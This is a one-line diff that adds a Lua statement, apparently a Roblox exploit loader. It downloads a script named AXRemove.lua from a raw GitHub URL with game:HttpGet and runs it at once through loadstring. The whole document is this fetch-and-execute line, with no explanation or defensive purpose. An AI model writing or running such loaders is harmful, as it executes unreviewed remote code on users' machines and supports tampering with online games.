@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Waza80/scripts-new/main/AXRemove.lua"))()
